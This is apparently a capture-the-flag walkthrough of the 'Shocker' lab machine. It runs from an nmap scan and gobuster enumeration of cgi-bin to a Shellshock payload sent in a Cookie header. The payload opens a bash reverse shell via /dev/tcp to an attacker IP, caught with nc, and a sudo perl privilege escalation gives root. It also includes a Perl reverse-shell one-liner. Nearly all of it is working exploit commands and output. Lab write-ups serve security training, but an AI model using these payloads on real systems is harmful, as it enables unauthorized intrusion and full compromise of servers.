80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu)) 
| http-methods:  
|_  Supported Methods: POST OPTIONS GET HEAD 
|_http-server-header: Apache/2.4.18 (Ubuntu) 
|_http-title: Site doesn't have a title (text/html). 
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) 
| ssh-hostkey:  
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA) 
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA) 
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519) 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 





gobuster dir -u  <website> -w  Wordlist small.txt 
now in cgi-bin/ use -x option and find sh,pl for sh scripts and perl scripts. 


Use burp 

GET /cgi-bin/user.sh HTTP/1.1
Host: localhost:8081
Cookie: () { :;}; echo; /bin/bash -c ls
Connection: close


bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

GET /cgi-bin/user.sh HTTP/1.1
Host: localhost:8081
Cookie: () { :;}; echo; /bin/bash -i >& /dev/tcp/10.10.14.242/8082 0>&1
Connection: close


Now you have a rev shell


bob@kali:~/Desktop/Ethical_Hacking/shocker$ nc -nlvp 8082 
listening on [any] 8082 ... 
connect to [10.10.14.242] from (UNKNOWN) [10.10.10.56] 59806 
bash: no job control in this shell 
shelly@Shocker:/usr/lib/cgi-bin$ 
 '
 
 
 Now we have use check for sudo priv.
 
 
 
 shelly@Shocker:/home/shelly$ sudo -l 
sudo -l 
Matching Defaults entries for shelly on Shocker: 
    env_reset, mail_badpass, 
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 
 
User shelly may run the following commands on Shocker: 
    (root) NOPASSWD: /usr/bin/perl
 

You can either get a rev shell 

perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

or do 

sudo /usr/bin/perl -e ‘exec("/bin/bash")’

boom #
